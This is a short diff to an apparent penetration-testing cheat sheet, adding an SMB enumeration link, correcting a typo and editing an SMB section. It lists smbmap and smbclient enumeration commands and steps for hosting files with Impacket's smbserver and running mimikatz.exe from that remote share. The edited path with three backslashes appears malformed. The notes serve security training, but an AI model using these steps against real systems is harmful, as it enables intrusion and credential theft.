@@ -200,6 +200,7 @@ Show listening ports
 
 SMB - Enumeration
 ----------------
+- https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
 - smbmap -H 10.10.10.10
 - smbclient -L 10.0.0.146
 - smbclient //10.10.10.10/share$
@@ -213,10 +214,10 @@ Password: (password)
 
 [*] Trying protocol 445/SMB...
 
-- Impacket's SMBServer (For File Trasnfer)
+- Impacket's SMBServer (For File Transfer)
 1. cd /usr/share/windows-binaries
 2. python /usr/share/doc/python-impacket/examples/smbserver.py a .
-3. \\10.10.10.10\a\mimikatz.exe
+3. \\\10.10.10.10\a\mimikatz.exe
 
 SMTP Enumeration
 ----------------
